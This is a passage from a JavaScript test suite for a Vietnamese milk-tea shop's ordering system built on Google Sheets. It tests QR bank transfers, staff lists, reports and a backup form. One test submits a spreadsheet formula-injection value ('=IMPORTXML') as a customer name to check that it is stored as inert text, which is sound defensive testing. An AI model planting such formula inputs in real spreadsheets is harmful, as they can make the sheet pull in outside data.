  const before = plain(sheet.cells);
  env.setup();
  assert.equal(env.movedColumns, moved, 'chạy lại không chuyển cột');
  assert.deepEqual(plain(sheet.cells), before);
  assert.equal(sheet.protections.length, 1, 'không nhân đôi cảnh báo');
});

test('setup mới: tab Cấu hình không phải chuyển cột; ý nghĩa nằm ở cột đầu', () => {
  const env = readyEnv();
  assert.equal(env.movedColumns || 0, 0);
  const sheet = env.sheets.get('Cấu hình');
  assert.match(sheet.value(2, 1), /Chọn Đóng cửa để tạm dừng mọi kênh đặt hàng/);
  assert.equal(sheet.value(2, 2), 'Mở cửa');
  assert.equal(sheet.value(2, 3), 'orders_open');
});

test('nhãn ngắn có ghi chú giải thích; độ rộng đủ cho nhãn và mũi tên lọc; tiêu đề canh trái', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const note = (key) => sheet.notes[env.columnOf('Đơn hàng', key)];
  assert.match(note('delivery_method'), /giao, tu_lay/);
  assert.match(note('payment_method'), /cod, chuyen_khoan/);
  assert.match(note('zone'), /trong_2km, den_10km/);
  assert.match(note('status'), /moi/);
  assert.match(note('payment_status'), /da_nhan/);
  assert.equal(sheet.headerAlignment, 'left');
  const shownColumns = ['notified_at', 'submission_id', 'items', 'transfer_qr_url'];
  headerRow(env, 'Đơn hàng').forEach((label, index) => {
    if (sheet.hiddenColumns.has(index + 1)) return;
    assert.ok(sheet.columnWidths[index + 1] >= label.length * 9 + 28, label);
  });
  assert.equal(shownColumns.length, sheet.hiddenColumns.size);
  for (const name of ['Món', 'Topping']) {
    assert.match(env.sheets.get(name).notes[env.columnOf(name, 'status')], /inactive/);
  }
});

/* ---------- Đợt 2: nâng cấp Sheet cũ ---------- */

/** Đưa Sheet về đúng trạng thái đợt 1: không có cột QR, tab Đơn lỗi và các khoá Cấu hình mới. */
function dot1Env() {
  const env = readyEnv();
  env.useEnglishHeaders();
  env.sheets.delete('Đơn lỗi');
  const orders = env.sheets.get('Đơn hàng');
  const qrColumn = orders.cells[0].indexOf('transfer_qr_url');
  orders.cells.forEach((row) => row.splice(qrColumn, 1));
  const config = env.sheets.get('Cấu hình');
  // Thứ tự cột cũ: khoá, giá trị, ghi chú. Khi đó chưa ẩn hay định dạng gì.
  config.cells = config.cells.map((row) => [row[2], row[1], row[0]]);
  config.cells = config.cells.filter((row) => !['shop_address', 'maps_max_stops', 'bank_code', 'bank_account', 'bank_account_name'].includes(row[0]));
  config.numberFormats = {};
  config.hiddenColumns = undefined;
  config.protections = [];
  config.bandings = [];
  env.useOldTabNames();
  return env;
}

test('Sheet đợt 1 chưa chạy lại setup vẫn nhận đơn và báo đơn; chuyển khoản landing bị từ chối', () => {
  const env = dot1Env();
  assert.equal(env.post(order()).ok, true);
  assert.equal(env.post(order({ payment_method: 'chuyen_khoan' })).error_code, 'INVALID_INPUT');
  assert.equal(env.getJson().transfer_enabled, false);
  assert.equal(env.pending().orders.length, 1);
  assert.deepEqual(env.pending().backup_errors, []);
});

test('setup trên Sheet đợt 1: thêm Cấu hình và tab mới, không mất đơn, không ghi đè Cấu hình đã sửa', () => {
  const env = dot1Env();
  const created = env.post(order());
  env.setConfig('max_cups', 123);

  env.setup();

  assert.ok(env.sheets.get('Đơn lỗi'));
  const rows = env.orderRows();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].order_code, created.order_code);
  assert.equal(rows[0].total, 108000);
  assert.equal(rows[0].transfer_qr_url, '');
  const config = env.configRows();
  assert.equal(config.find((r) => r.key === 'max_cups').value, 123);
  assert.equal(config.find((r) => r.key === 'maps_max_stops').value, 4);
  assert.equal(config.find((r) => r.key === 'bank_account').value, '');
  assert.equal(new Set(config.map((r) => r.key)).size, config.length);
});

test('setup đặt ô tài khoản ngân hàng dạng chữ để không mất số 0 đầu', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Cấu hình');
  const rows = sheet.getDataRange().getValues();
  const row = rows.findIndex((r) => r[env.columnOf('Cấu hình', 'key') - 1] === 'bank_account') + 1;
  const column = env.columnOf('Cấu hình', 'value');
  assert.equal(sheet.numberFormats[`${row},${column}`], '@');
});

/* ---------- Đợt 2: QR ---------- */

function withBank(env) {
  env.setConfig('bank_code', 'vcb');
  env.setConfig('bank_account', "'0123456789");
  env.setConfig('bank_account_name', 'NGUYEN VAN A');
  return env;
}

test('QR hợp lệ: landing trả transfer, payment_status = cho_chuyen_khoan, cấu hình công khai không lộ tài khoản', () => {
  const env = withBank(readyEnv());
  const config = env.getJson();
  assert.equal(config.transfer_enabled, true);
  assert.ok(!JSON.stringify(config).includes('0123456789'));

  const result = env.post(order({ payment_method: 'chuyen_khoan' }));
  assert.equal(result.ok, true);
  assert.equal(result.transfer.amount, 108000);
  assert.equal(result.transfer.content, result.order_code);
  assert.equal(result.transfer.bank_code, 'vcb');
  assert.equal(result.transfer.bank_account, '0123456789');
  assert.equal(result.transfer.bank_account_name, 'NGUYEN VAN A');
  const url = new URL(result.transfer.qr_url);
  assert.equal(url.hostname, 'img.vietqr.io');
  assert.match(url.pathname, /\/vcb-0123456789-/);
  assert.equal(url.searchParams.get('amount'), '108000');
  assert.equal(url.searchParams.get('addInfo'), result.order_code);
  assert.equal(url.searchParams.get('accountName'), 'NGUYEN VAN A');
  assert.equal(env.orderRows()[0].payment_status, 'cho_chuyen_khoan');
  assert.equal(result.needs_call, undefined, 'landing không thấy cờ nội bộ');
});

test('QR thiếu cấu hình: landing INVALID_INPUT, không ghi, transfer_enabled false', () => {
  for (const missing of ['bank_code', 'bank_account', 'bank_account_name']) {
    const env = withBank(readyEnv());
    env.setConfig(missing, '');
    assert.equal(env.getJson().transfer_enabled, false, missing);
    assert.equal(env.post(order({ payment_method: 'chuyen_khoan' })).error_code, 'INVALID_INPUT', missing);
    assert.equal(env.orderRows().length, 0, missing);
    assert.equal(env.post(order()).ok, true, 'COD vẫn nhận');
  }
});

test('Gửi lại đơn chuyển khoản: cùng mã đơn và đúng transfer, kể cả khi Cấu hình đã đổi hoặc đã xoá', () => {
  const env = withBank(readyEnv());
  const payload = order({ payment_method: 'chuyen_khoan' });
  const first = env.post(payload);
  assert.deepEqual(env.post(payload), first);
  env.setConfig('bank_account', "'9999999999");
  assert.deepEqual(env.post(payload), first);
  env.setConfig('bank_code', '');
  assert.deepEqual(env.post(payload), first);
  assert.equal(env.orderRows().length, 1);
});

test('đơn COD không có transfer dù đã có cấu hình; hợp đồng đợt 1 giữ nguyên', () => {
  const env = withBank(readyEnv());
  assert.deepEqual(Object.keys(env.post(order())).sort(), ['message', 'ok', 'order_code', 'shipping_fee', 'total']);
});

test('form nội bộ: chuyển khoản trả QR; thiếu cấu hình vẫn lưu được và không có transfer', () => {
  const env = readyEnv();
  const noBank = env.staff(order({ payment_method: 'chuyen_khoan' }));
  assert.equal(noBank.ok, true);
  assert.equal(noBank.transfer, undefined);
  withBank(env);
  const result = env.staff(order({ payment_method: 'chuyen_khoan' }));
  assert.equal(result.transfer.content, result.order_code);
});

test('trang mẫu và form nội bộ: có chọn thanh toán, hiện QR, số tiền, nội dung', () => {
  const landing = read('landing-example.html');
  assert.match(landing, /name="payment" value="chuyen_khoan"/);
  assert.match(landing, /transfer_enabled/);
  assert.match(landing, /data\.transfer\.qr_url/);
  assert.match(landing, /id="transfer-amount"/);
  assert.match(landing, /id="transfer-content"/);
  const staff = read('apps-script/Staff.html');
  for (const html of [landing, staff]) {
    for (const id of ['transfer-bank', 'transfer-account', 'transfer-account-name', 'transfer-link', 'transfer-qr-error']) {
      assert.match(html, new RegExp(`id="${id}"`), id);
    }
    assert.match(html, /addEventListener\('error'/);
  }
  assert.match(staff, /requestId !== latestListsRequest/);
  assert.match(staff, /transfer\.qr_url/);
  assert.match(staff, /staffOpsLists\(KEY\)/);
  assert.match(staff, /id="view-prep"/);
  assert.match(staff, /id="view-delivery"/);
  assert.ok(!/innerHTML/.test(staff));
});

/* ---------- Đợt 2: SĐT bom ---------- */

test('SĐT từng bom: đơn COD 1 cốc cần gọi ở mọi kênh, đơn chuyển khoản không bị đánh dấu', () => {
  const env = withBank(readyEnv());
  const phone = '0912345678';
  const bombed = env.post(order({ phone, ...cups(1) }));
  assert.equal(env.orderRows()[0].needs_call, false);
  env.setOrderStatus(bombed.order_code, 'bom');

  const landing = env.post(order({ phone: '+84 912 345 678', ...cups(1) }));
  assert.equal(landing.needs_call, undefined, 'không báo cho khách biết');
  assert.equal(env.orderRows()[1].needs_call, true);

  assert.equal(env.staff(order({ phone, ...cups(1) })).needs_call, true);

  env.gs.setupBackupForm();
  env.submitForm(backupAnswers({ [FIELDS.phone]: '091.234.5678' }));
  assert.equal(env.orderRows().find((r) => r.source === 'backup').needs_call, true);

  assert.equal(env.staff(order({ phone, payment_method: 'chuyen_khoan', ...cups(1) })).needs_call, false);
  env.post(order({ phone, payment_method: 'chuyen_khoan', ...cups(1) }));
  assert.equal(env.orderRows().at(-1).needs_call, false);

  assert.equal(env.staff(order({ phone: '0987654321', ...cups(1) })).needs_call, false);
});

/* ---------- Đợt 2: danh sách ---------- */

const SECOND_TOPPING = { items: [{ product_id: 'tra-sua-truyen-thong', quantity: 1, toppings: ['thach-pho-mai'] }] };
const lists = (env) => env.getJson({ action: 'ops_lists', key: N8N_KEY });

test('gom pha chế: cùng món và topping cộng cốc, khác topping thành dòng riêng, có mã đơn', () => {
  const env = readyEnv();
  const a = env.post(order(cups(2)));
  const b = env.post(order(cups(1)));
  const c = env.post(order(SECOND_TOPPING));
  const { prep } = lists(env);
  assert.equal(prep.total_cups, 4);
  assert.equal(prep.lines.length, 2);
  const plainLine = prep.lines.find((l) => l.toppings.length === 0);
  assert.equal(plainLine.cups, 3);
  assert.deepEqual(plainLine.order_codes, [a.order_code, b.order_code]);
  const toppingLine = prep.lines.find((l) => l.toppings.length === 1);
  assert.equal(toppingLine.cups, 1);
  assert.deepEqual(toppingLine.toppings, ['Thạch phô mai (mẫu)']);
  assert.deepEqual(toppingLine.order_codes, [c.order_code]);
});

test('món ngừng bán sau khi đặt vẫn hiện đúng tên trong danh sách pha chế', () => {
  const env = readyEnv();
  env.post(order());
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-truyen-thong', 'status', 'inactive');
  assert.equal(lists(env).prep.lines[0].product_name, 'Trà sữa truyền thống (mẫu)');
});

test('chưa đủ điều kiện: chuyển khoản chưa nhận hoặc cần gọi chưa gọi không vào danh sách nào', () => {
  const env = readyEnv();
  const transfer = env.staff(order({ payment_method: 'chuyen_khoan' }));
  const call = env.post(order(cups(5)));
  let current = lists(env);
  assert.equal(current.prep.total_cups, 0);
  assert.equal(current.delivery.stops, 0);
  assert.deepEqual(current.held.map((h) => [h.order_code, h.reason]), [
    [transfer.order_code, 'chờ chuyển khoản'],
    [call.order_code, 'chờ gọi: đơn lớn, trả tiền mặt'],
  ]);
  assert.equal(current.held[0].amount, transfer.total);
  assert.match(current.held[0].phone, /^0\d{9}$/);
  assert.match(current.text, new RegExp(`${transfer.order_code} · 0\\d{9} · 108\\.000đ · chờ chuyển khoản`));
  assert.equal(plain(env.gs.staffOpsLists(STAFF_KEY)).held.length, 2);

  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === call.order_code, 'call_done', true);
  current = lists(env);
  assert.equal(current.prep.total_cups, 5);
  assert.equal(current.delivery.stops, 0, 'chuẩn bị xong mới giao');

  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === transfer.order_code, 'payment_status', 'da_nhan');
  current = lists(env);
  assert.equal(current.prep.total_cups, 7);
  assert.equal(current.delivery.stops, 0);
  assert.deepEqual(current.held, []);

  env.setOrderStatus(call.order_code, 'dang_giao');
  env.setOrderStatus(transfer.order_code, 'dang_giao');
  current = lists(env);
  assert.equal(current.prep.total_cups, 0);
  assert.equal(current.delivery.stops, 2);
});

test('đơn đang chờ làm đổi dấu danh sách; đơn huỷ rời mục đang chờ', () => {
  const env = readyEnv();
  const held = env.staff(order({ payment_method: 'chuyen_khoan' }));
  const first = lists(env);
  assert.equal(first.changed, true, 'chỉ có đơn đang chờ vẫn phải báo');
  env.post({ signature: first.signature }, { action: 'ops_lists_ack', key: N8N_KEY });
  env.setOrderStatus(held.order_code, 'huy');
  const after = lists(env);
  assert.equal(after.changed, true);
  assert.deepEqual(after.held, []);
});

test('ghi chú khách hiện kèm mã đơn trong danh sách pha chế, ở email và trong dữ liệu form nội bộ', () => {
  const env = readyEnv();
  const noted = env.post(order({ note: 'ít đường' }));
  env.post(order());
  const current = lists(env);
  assert.deepEqual(current.prep.lines[0].notes, [{ order_code: noted.order_code, note: 'ít đường' }]);
  assert.match(current.text, new RegExp(`\\n    ${noted.order_code}: ít đường`));
  assert.deepEqual(plain(env.gs.staffOpsLists(STAFF_KEY)).prep.lines[0].notes, current.prep.lines[0].notes);
  assert.match(read('apps-script/Staff.html'), /line\.notes\.forEach/);
});

test('chuẩn bị xong mới giao: Chuẩn bị gồm moi, dang_lam; Giao và tự lấy chỉ dang_giao; không đơn nào ở cả hai', () => {
  const env = readyEnv();
  const codes = ['moi', 'dang_lam', 'dang_giao', 'xong', 'huy', 'bom'].map((status) => {
    const created = env.post(order(cups(1)));
    env.setOrderStatus(created.order_code, status);
    return created.order_code;
  });
  const pickup = env.post(order({ delivery_method: 'tu_lay', zone: '', address: '', ...cups(1) }));
  let current = lists(env);
  assert.deepEqual(current.delivery.zones[0].orders.map((o) => o.order_code), [codes[2]]);
  assert.deepEqual(current.pickup.orders, [], 'đơn tự lấy chưa làm xong chưa vào phần tự lấy');
  assert.deepEqual(current.prep.lines[0].orders.map((o) => [o.order_code, o.status]), [
    [codes[0], 'moi'], [codes[1], 'dang_lam'], [pickup.order_code, 'moi'],
  ]);
  assert.equal(current.prep.total_cups, 3);
  assert.match(current.text, new RegExp(`${codes[1]} đang làm`));
  assert.equal(current.subject, '📋 Cần chuẩn bị 3 phần · giao 1 điểm');

  env.setOrderStatus(pickup.order_code, 'dang_giao');
  current = lists(env);
  assert.deepEqual(current.pickup.orders.map((o) => o.order_code), [pickup.order_code]);
  assert.equal(current.prep.total_cups, 2);
  const prepCodes = current.prep.lines.flatMap((l) => l.order_codes);
  const handoverCodes = current.delivery.zones.flatMap((z) => z.orders.map((o) => o.order_code))
    .concat(current.pickup.orders.map((o) => o.order_code));
  assert.deepEqual(prepCodes.filter((c) => handoverCodes.includes(c)), []);
});

test('danh sách giao: gom theo khu vực, tiền phải thu COD bằng total và da_nhan bằng 0, tổng khớp', () => {
  const env = readyEnv();
  const cod = env.post(order({ zone: 'den_10km', phone: '0912345678', address: 'Nhà COD' }));
  const paid = env.staff(order({ zone: 'den_10km', payment_method: 'chuyen_khoan', address: 'Nhà đã trả' }));
  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === paid.order_code, 'payment_status', 'da_nhan');
  const near = env.post(order({ zone: 'trong_2km', ...cups(1) }));
  [cod, paid, near].forEach((o) => env.setOrderStatus(o.order_code, 'dang_giao'));
  const { delivery } = lists(env);
  assert.deepEqual(delivery.zones.map((z) => z.zone), ['trong_2km', 'den_10km']);
  assert.equal(delivery.zones[0].orders[0].order_code, near.order_code);
  const far = delivery.zones[1];
  assert.equal(far.orders.find((o) => o.order_code === cod.order_code).amount_due, 108000);
  assert.equal(far.orders.find((o) => o.order_code === paid.order_code).amount_due, 0);
  assert.equal(far.amount_due_total, 108000);
  assert.equal(far.orders[0].phone, '0912345678');
  assert.equal(far.orders[0].address, 'Nhà COD');
  assert.equal(delivery.amount_due_total, 108000 + 49000);
});

test('hơn giới hạn điểm: nhiều link theo maps_max_stops, không mất điểm, xuất phát từ shop_address', () => {
  const env = readyEnv();
  env.setConfig('maps_max_stops', 2);
  env.setConfig('shop_address', '1 Điểm Bán');
  env.setConfig('max_cups_per_phone_public', 100);
  const made = [1, 2, 3, 4, 5].map((n) => env.post(order({ address: `Số ${n} Đường A`, ...cups(1) })).order_code);
  made.forEach((code) => env.setOrderStatus(code, 'dang_giao'));
  const zone = lists(env).delivery.zones[0];
  assert.equal(zone.map_links.length, 3);
  assert.deepEqual(zone.map_links.flatMap((l) => l.order_codes), made);
  zone.map_links.forEach((link) => {
    assert.equal(new URL(link.url).searchParams.get('origin'), '1 Điểm Bán');
    assert.ok(link.order_codes.length <= 2);
  });
});

test('không có email khi danh sách không đổi; chỉ lưu dấu sau khi gửi', () => {
  const env = readyEnv();
  assert.equal(lists(env).changed, false, 'danh sách trống từ đầu thì không gửi');
  const created = env.post(order());
  const first = lists(env);
  assert.equal(first.changed, true);
  assert.equal(env.props.has('OPS_LISTS_SIGNATURE'), false, 'lấy danh sách không được lưu dấu');
  assert.equal(lists(env).changed, true, 'chưa gửi thì lần sau vẫn gửi');

  assert.deepEqual(env.post({ signature: first.signature }, { action: 'ops_lists_ack', key: N8N_KEY }), { ok: true });
  assert.equal(lists(env).changed, false);
  assert.equal(lists(env).signature, first.signature, 'dấu không phụ thuộc thời điểm');

  env.setOrderStatus(created.order_code, 'huy');
  const emptied = lists(env);
  assert.equal(emptied.changed, true, 'danh sách trống đi cũng là thay đổi');
  assert.equal(env.post({ signature: '' }, { action: 'ops_lists_ack', key: N8N_KEY }).error_code, 'INVALID_INPUT');
  assert.equal(env.post('[]', { action: 'ops_lists_ack', key: N8N_KEY }).error_code, 'INVALID_INPUT');
});

test('xem chủ động: đúng khoá thấy danh sách mới nhất, không đổi dấu đã gửi; sai khoá thì UNAUTHORIZED', () => {
  const env = readyEnv();
  env.post(order());
  const sent = lists(env).signature;
  env.post({ signature: sent }, { action: 'ops_lists_ack', key: N8N_KEY });

  const created = env.post(order(cups(1)));
  const view = plain(env.gs.staffOpsLists(STAFF_KEY));
  assert.equal(view.ok, true);
  assert.equal(view.prep.total_cups, 3);
  assert.equal(view.delivery.stops, 0, 'chưa làm xong thì chưa vào Giao');
  assert.match(view.generated_at, /^\d{4}-\d{2}-\d{2} /);
  assert.equal(view.signature, undefined);
  assert.equal(env.props.get('OPS_LISTS_SIGNATURE'), sent);
  assert.equal(lists(env).changed, true, 'xem không làm email lỡ mất thay đổi');

  for (const key of ['sai', '', undefined, N8N_KEY]) {
    const denied = plain(env.gs.staffOpsLists(key));
    assert.equal(denied.error_code, 'UNAUTHORIZED');
    assert.ok(!JSON.stringify(denied).includes(created.order_code));
  }
});

test('sai khoá ở endpoint mới: UNAUTHORIZED, không lộ dữ liệu, không lưu dấu', () => {
  const env = readyEnv();
  env.post(order({ name: 'Khách bí mật' }));
  for (const key of ['sai', '', undefined, STAFF_KEY]) {
    for (const action of ['ops_lists', 'report']) {
      const raw = env.get({ action, key }).content;
      assert.equal(JSON.parse(raw).error_code, 'UNAUTHORIZED');
      assert.ok(!raw.includes('Khách bí mật'));
    }
    assert.equal(env.post({ signature: 'x' }, { action: 'ops_lists_ack', key }).error_code, 'UNAUTHORIZED');
  }
  assert.equal(env.props.has('OPS_LISTS_SIGNATURE'), false);
});

test('Sheets lỗi ở endpoint mới: SERVER_ERROR', () => {
  const env = readyEnv();
  env.sheetsBroken = true;
  assert.equal(lists(env).error_code, 'SERVER_ERROR');
  assert.equal(env.getJson({ action: 'report', key: N8N_KEY }).error_code, 'SERVER_ERROR');
  assert.equal(plain(env.gs.staffOpsLists(STAFF_KEY)).error_code, 'SERVER_ERROR');
});

/* ---------- Đợt 2: báo cáo ---------- */

const report = (env) => env.getJson({ action: 'report', key: N8N_KEY });

test('báo cáo: số khớp công thức, theo cốc, tiền chỉ tính đơn đã thu', () => {
  const env = withBank(readyEnv());
  env.setConfig('max_cups_per_phone_public', 100);
  env.setConfig('call_threshold_cups', 100);
  // COD xong 3 cốc = 157.000đ; bom 1 cốc; huỷ 4 cốc; đang chờ 2 cốc.
  env.setOrderStatus(env.post(order(cups(3))).order_code, 'xong');
  env.setOrderStatus(env.post(order(cups(1))).order_code, 'bom');
  env.setOrderStatus(env.post(order(cups(4))).order_code, 'huy');
  env.post(order(cups(2)));
  // Đã nhận tiền, chưa xong: 1 cốc = 59.000đ.
  const paid = env.post(order({ payment_method: 'chuyen_khoan', ...cups(1) }));
  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === paid.order_code, 'payment_status', 'da_nhan');
  // Đã nhận tiền rồi huỷ: không tính.
  const refunded = env.post(order({ payment_method: 'chuyen_khoan', ...cups(1) }));
  env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === refunded.order_code, 'payment_status', 'da_nhan');
  env.setOrderStatus(refunded.order_code, 'huy');
  // Chờ chuyển khoản: không tính.
  env.post(order({ payment_method: 'chuyen_khoan', ...cups(1) }));

  const result = report(env);
  assert.equal(result.ok, true);
  const bucket = result.cumulative;
  assert.equal(bucket.cups, 8, 'mọi đơn trừ huy');
  assert.equal(bucket.revenue, 157000 + 59000);
  assert.equal(bucket.bom_rate_percent, 25, 'bom 1 cốc / (bom 1 + xong 3)');
  assert.deepEqual(bucket.by_status.huy, { orders: 2, cups: 5 });
  assert.deepEqual(bucket.by_status.moi, { orders: 3, cups: 4 });
  assert.equal(result.remaining_cups, 600 - 8);
  assert.match(result.text, /còn 592\/600 phần\./);
  assert.match(result.text, /Tỷ lệ bom: 25%/);
  assert.match(result.text, /216\.000đ/);
  assert.match(result.text, /CẢ ĐỢT · 8 phần · 216\.000đ/);
  assert.match(result.subject, /^📊 Hôm nay: 8 phần · 216\.000đ$/);
  assert.doesNotMatch(result.text, /Việc tiếp theo/);
});

test('báo cáo: chia cho 0 thành 0%, Sheet trống vẫn ra số', () => {
  const env = readyEnv();
  const empty = report(env);
  assert.equal(empty.today.bom_rate_percent, 0);
  assert.equal(empty.cumulative.bom_rate_percent, 0);
  assert.equal(empty.remaining_cups, 600);
  env.post(order());
  assert.equal(report(env).cumulative.bom_rate_percent, 0);
});

test('báo cáo: hôm nay tính theo ngày Việt Nam, cộng dồn gồm cả ngày trước', () => {
  const env = readyEnv();
  const vnDay = (date) => new Date(date.getTime() + 7 * 3600 * 1000).toISOString().slice(0, 10);
  const now = new Date();
  const today = vnDay(now);
  const startOfDay = Date.parse(`${today}T00:00:00+07:00`);

  const old = env.post(order(cups(3)));
  const early = env.post(order(cups(2)));
  env.post(order(cups(1)));
  // 23:59 hôm qua giờ Việt Nam và 00:00 hôm nay giờ Việt Nam: cùng một ngày theo UTC.
  const setCreated = (code, ms) => env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === code, 'created_at', new Date(ms));
  setCreated(old.order_code, startOfDay - 60 * 1000);
  setCreated(early.order_code, startOfDay);

  const result = report(env);
  assert.equal(result.date, today);
  assert.equal(result.today.cups, 3);
  assert.equal(result.cumulative.cups, 6);
});

/* ---------- Đợt 2: Form dự phòng ---------- */

const FIELDS = {
  name: 'Tên', phone: 'Số điện thoại', product: 'Món', quantity: 'Số lượng', toppings: 'Topping',
  delivery: 'Nhận hàng', zone: 'Khu vực giao', address: 'Địa chỉ giao', note: 'Ghi chú',
};

function backupAnswers(overrides) {
  return {
    [FIELDS.name]: 'Khách Form',
    [FIELDS.phone]: '0900000001',
    [FIELDS.product]: 'Trà sữa truyền thống (mẫu)',
    [FIELDS.quantity]: '2',
    [FIELDS.delivery]: 'Giao hàng',
    [FIELDS.zone]: 'Đến 10km',
    [FIELDS.address]: '12 Đường Form',
    ...overrides,
  };
}

function backupEnv() {
  const env = readyEnv();
  env.gs.setupBackupForm();
  return env;
}
const backupRows = (env) => {
  const values = env.sheets.get('Đơn lỗi').getDataRange().getValues();
  const keys = env.gs.headerKeys_('Đơn lỗi', values[0]);
  return values.slice(1).map((row) => Object.fromEntries(keys.map((h, i) => [h, row[i]])));
};

test('setupBackupForm: tạo Form và một trigger; chạy lại không tạo trùng và cập nhật thực đơn', () => {
  const env = backupEnv();
  assert.equal(env.forms.size, 1);
  assert.equal(env.triggers.length, 1);
  assert.equal(env.triggers[0].getHandlerFunction(), 'onBackupFormSubmit');
  const form = [...env.forms.values()][0];
  assert.equal(form.published, true);
  assert.deepEqual(form.items.map((i) => i.title), [
    FIELDS.name, FIELDS.phone, FIELDS.product, FIELDS.quantity, FIELDS.toppings,
    FIELDS.delivery, FIELDS.zone, FIELDS.address, FIELDS.note,
  ]);
  const count = form.items.length;

  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-matcha', 'status', 'inactive');
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-truyen-thong', 'name', 'Trà sữa thật');
  const url = env.gs.setupBackupForm();
  assert.match(url, /viewform/);
  assert.equal(env.forms.size, 1);
  assert.equal(env.triggers.length, 1);
  assert.equal(form.items.length, count);
  assert.deepEqual(plain(form.items.find((i) => i.title === FIELDS.product).choices), ['Trà sữa thật']);
});

test('setupBackupForm: không mở được Form cũ thì báo lỗi, giữ trigger; chỉ tạo mới khi đã xoá thuộc tính', () => {
  const env = backupEnv();
  const oldId = env.props.get('BACKUP_FORM_ID');
  const missing = env.forms.get(oldId);
  env.forms.clear();
  assert.throws(() => env.gs.setupBackupForm(), /BACKUP_FORM_ID/);
  assert.equal(env.forms.size, 0, 'không tự tạo Form mới');
  assert.equal(env.props.get('BACKUP_FORM_ID'), oldId);
  assert.equal(env.triggers.length, 1);
  assert.equal(env.triggers[0].getTriggerSourceId(), oldId);

  // Lỗi tạm thời đã qua: chạy lại dùng đúng Form và link cũ.
  env.forms.set(oldId, missing);
  env.gs.setupBackupForm();
  assert.equal(env.props.get('BACKUP_FORM_ID'), oldId);
  assert.equal(env.triggers.length, 1);

  env.forms.clear();
  env.props.delete('BACKUP_FORM_ID');
  env.gs.setupBackupForm();
  assert.equal(env.triggers.length, 1);
  assert.equal(env.triggers[0].getTriggerSourceId(), env.props.get('BACKUP_FORM_ID'));
});

test('dự phòng: mã phản hồi dài của Form vẫn tạo được đơn', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers(), 'x'.repeat(150));
  assert.equal(env.orderRows().length, 1);
  assert.equal(backupRows(env).length, 0);
});

test('dự phòng hợp lệ: một dòng source = backup, COD, tiền và mã đơn do server tính', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers());
  const rows = env.orderRows();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].source, 'backup');
  assert.equal(rows[0].payment_method, 'cod');
  assert.equal(rows[0].payment_status, 'cod');
  assert.equal(rows[0].total, 108000);
  assert.equal(rows[0].order_code, 'TS-0001');
  assert.equal(backupRows(env).length, 0);
  assert.equal(env.pending().orders[0].source, 'backup');
  assert.equal(lists(env).prep.total_cups, 2, 'vào cùng danh sách');
});

test('dự phòng có topping và tự lấy: map đúng tên về mã', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers({
    [FIELDS.toppings]: ['Thạch phô mai (mẫu)'],
    [FIELDS.delivery]: 'Tự đến lấy',
    [FIELDS.zone]: undefined,
    [FIELDS.address]: undefined,
  }));
  const row = env.orderRows()[0];
  assert.equal(row.delivery_method, 'tu_lay');
  assert.equal(row.total, 2 * 54000);
});

test('dự phòng gửi lại cùng mã phản hồi: không tạo dòng mới, không có lỗi', () => {
  const env = backupEnv();
  const answers = backupAnswers();
  env.submitForm(answers, 'phan-hoi-1');
  env.submitForm(answers, 'phan-hoi-1');
  assert.equal(env.orderRows().length, 1);
  assert.equal(backupRows(env).length, 0);
});

test('dự phòng sai dữ liệu: không tạo đơn, ghi Đơn lỗi đủ câu trả lời, gửi lại không trùng', () => {
  const env = backupEnv();
  const answers = backupAnswers({ [FIELDS.phone]: '123', [FIELDS.name]: '=IMPORTXML("x")' });
  env.submitForm(answers, 'phan-hoi-sai');
  env.submitForm(answers, 'phan-hoi-sai');
  assert.equal(env.orderRows().length, 0);
  const rows = backupRows(env);
  assert.equal(rows.length, 1);
  assert.equal(rows[0].response_id, 'phan-hoi-sai');
  assert.equal(rows[0].error_code, 'INVALID_INPUT');
  assert.match(rows[0].answers, /Số điện thoại: 123/);
  assert.match(rows[0].answers, /Địa chỉ giao: 12 Đường Form/);
  assert.match(rows[0].answers, /=IMPORTXML/);
  assert.equal(env.sheets.get('Đơn lỗi').formulas.length, 0);
  assert.equal(env.lockHeld, false);
});

test('dự phòng: thiếu địa chỉ khi giao và số cốc sai đều vào Đơn lỗi', () => {
  const env = backupEnv();
  env.submitForm(backupAnswers({ [FIELDS.address]: undefined }));
  env.submitForm(backupAnswers({ [FIELDS.quantity]: '1.5' }));
  assert.equal(env.orderRows().length, 0);
  assert.equal(backupRows(env).length, 2);
});

test('dự phòng hết suất, đóng đơn, quá giới hạn SĐT: không tạo đơn, ghi Đơn lỗi', () => {
  const env = backupEnv();
  env.setConfig('max_cups', 1);
  env.submitForm(backupAnswers());
  assert.equal(backupRows(env)[0].error_code, 'SOLD_OUT');
  env.setConfig('max_cups', 600);
  env.setConfig('orders_open', false);
  env.submitForm(backupAnswers());
  assert.equal(backupRows(env)[1].error_code, 'SOLD_OUT');
  env.setConfig('orders_open', true);
  env.setConfig('max_cups_per_phone_public', 1);
  env.submitForm(backupAnswers());
  assert.equal(backupRows(env)[2].error_code, 'LIMIT_EXCEEDED');
  assert.equal(env.orderRows().length, 0);
});

test('dự phòng đếm suất và giới hạn SĐT chung với landing', () => {
  const env = backupEnv();
  env.setConfig('max_cups_per_phone_public', 3);
  env.submitForm(backupAnswers());
  assert.equal(env.post(order({ phone: '0900000001', ...cups(2) })).error_code, 'LIMIT_EXCEEDED');
  assert.equal(env.post(order({ phone: '0900000001', ...cups(1) })).ok, true);
  assert.equal(env.pending().low_stock.counted_cups, 3);
});

test('dự phòng khi lock bận: không mất dữ liệu, trigger báo lỗi và Form vẫn giữ phản hồi', () => {
  const env = backupEnv();
  env.lockAvailable = false;
  assert.throws(() => env.submitForm(backupAnswers()), /lock/);
